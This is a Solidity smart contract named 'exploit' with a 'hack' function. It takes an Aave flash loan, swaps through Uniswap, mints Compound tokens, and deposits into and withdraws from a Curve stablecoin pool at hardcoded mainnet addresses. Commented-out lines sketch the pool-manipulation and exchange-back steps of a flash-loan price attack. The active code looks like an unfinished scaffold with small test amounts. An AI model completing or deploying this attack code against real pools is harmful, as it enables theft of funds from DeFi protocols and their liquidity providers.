//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface CurvePool {
	function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
	function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function remove_liquidity(uint256 _amount, uint256[3] calldata min_amounts) external;
	function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external;
	function balances(int128) external view returns (uint256);
	function get_virtual_price() external view returns (uint256);
}

interface FlashLendingPool {
	function flashLoan(address receiverAddress, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
}

interface UniSwap {
	function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
	function WETH() external pure returns (address);
}

interface CErc20 is IERC20{
	function mint(uint mintAmount) external returns (uint);
	function redeemUnderlying(uint redeemAmount) external returns (uint);
	function redeem(uint redeemTokens) external returns (uint);
}

contract exploit is Ownable {
	
	address curve = 0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C;
	address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;//0
	address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;//1
	address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;//2
	address curve_pool_token = 0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23;
	address LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//aave lending pool
	address uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
	
	address cusdt = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
	address cdai = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
	address cusdc = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
	
	constructor () {
		
		
	}

	event eventBalances(
		uint256 b1,
		uint256 b2,
		uint256 b3
	);

	function hack(uint256[3] calldata targets, int128 swap_from, int128 swap_to, uint256 amount) public onlyOwner payable {
		uint256 size;
		
		assembly {
			size := extcodesize(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C)
		}
		require(size > 0, 'Curve contract not found');
		//CurvePool(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C).get_virtual_price();
		
		uint256[3] memory bal;
		bal[0] = CurvePool(curve).balances(0);
		bal[1] = CurvePool(curve).balances(1);
		bal[2] = CurvePool(curve).balances(2);
		emit eventBalances(bal[0],bal[1],bal[2]);
		
        address[] memory assets = new address[](3);
        assets[0] = dai;
        assets[1] = usdc;
        assets[2] = usdt;

        // 0 = no debt, 1 = stable, 2 = variable
        uint256[] memory modes = new uint256[](3);
		modes[0] = 0;
		modes[1] = 0;
		modes[2] = 0;
		
		uint256[] memory loanAmounts = new uint256[](3);
        loanAmounts[0] = 10 ether; //targets[1] - bal[1];
        loanAmounts[1] = 100*10**6; //targets[0] - bal[0];
        loanAmounts[2] = 100*10**6; //targets[2] - bal[2];
		//require(targets[0] >= bal[0], 'Loan amount 0 too low');
		//require(targets[1] >= bal[1], 'Loan amount 1 too low');
		//require(targets[2] >= bal[2], 'Loan amount 2 too low');
		emit eventBalances(loanAmounts[0],loanAmounts[1],loanAmounts[2]);
        uint16 referralCode = 0;
		bytes memory params = "";//abi.encode(swap_from, swap_to, amount);
		
        FlashLendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            loanAmounts,
            modes,
            address(this),
            params,
            referralCode
        );
	}
	
	function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params) external returns (bool) {
			
		address[] memory path = new address[](2);
        path[0] = UniSwap(uniswap).WETH();
        path[1] = dai;
		UniSwap(uniswap).swapExactETHForTokens{value: 1 ether}(1, path, address(this), block.timestamp );
		path[1] = usdc;
		UniSwap(uniswap).swapExactETHForTokens{value: 1 ether}(1, path, address(this), block.timestamp );
		path[1] = usdt;
		UniSwap(uniswap).swapExactETHForTokens{value: 1 ether}(1, path, address(this), block.timestamp );
		
		
		IERC20(dai).approve(cdai, amounts[0]);
		require(CErc20(cdai).mint(amounts[0]) == 0,'cdai failed');
		
		IERC20(usdc).approve(cusdc, amounts[1]);
		require(CErc20(cusdc).mint(amounts[1]) == 0,'cusdc failed');
		
		//SafeERC20.safeApprove(IERC20(usdt), cusdt, amounts[2]);
		//require(CErc20(cusdt).mint(amounts[2]) == 0,'tusdt failed');
		

		//deposit funds to curve
		uint256[3] memory deposit;
		deposit[0] = CErc20(cdai).balanceOf(address(this));
		deposit[1] = CErc20(cusdc).balanceOf(address(this));
		deposit[2] = IERC20(usdt).balanceOf(address(this));
		
		{
			IERC20(cdai).approve(curve, deposit[0]);
			IERC20(cusdc).approve(curve, deposit[1]);
			SafeERC20.safeApprove(IERC20(usdt), curve, deposit[2]);
		}
		
		CurvePool(curve).add_liquidity(deposit, 0);
		{
			uint256[3] memory min_amounts;
			min_amounts[0] = 0;
			min_amounts[1] = 0;
			min_amounts[2] = 0;
			CurvePool(curve).remove_liquidity(IERC20(curve_pool_token).balanceOf(address(this)), min_amounts);
		}
		{
			//(int128 swap_from, int128 swap_to, uint256 amount) = abi.decode(params, (int128, int128, uint256) );
			//CurvePool(curve).exchange(0, 1, 1*10**6, 0);
			//CurvePool(curve).exchange(1, 0, 1*10**6, 0);
			
			//CurvePool(curve).exchange(0, 1, 1*10^18, 0);//throw off the point
			//uint256 ourBalance = IERC20(curve_pool_token).balanceOf(address(this));
			//CurvePool(curve).exchange(swap_to, swap_from, amount, 0); //exchange back
		
			//uint256[3] memory minAmounts;
			//CurvePool(curve).remove_liquidity(ourBalance, minAmounts);//get funds back
		}
		
		
		require(CErc20(cdai).redeem(CErc20(cdai).balanceOf(address(this))) == 0, 'cdai redeem failed');
		require(CErc20(cusdc).redeem(CErc20(cusdc).balanceOf(address(this))) == 0, 'usdc redeem failed');
		//require(CErc20(cusdt).redeem(CErc20(cusdt).balanceOf(address(this))) == 0, 'cusdt redeem failed');
		
        // Approve the LendingPool contract allowance to *pull* the owed amount
		IERC20(assets[0]).approve(LENDING_POOL, amounts[0] + premiums[0]);
		IERC20(assets[1]).approve(LENDING_POOL, amounts[1] + premiums[1]);
		SafeERC20.safeApprove(IERC20(assets[2]), LENDING_POOL, amounts[2] + premiums[2]);
        
        return true;
    }

}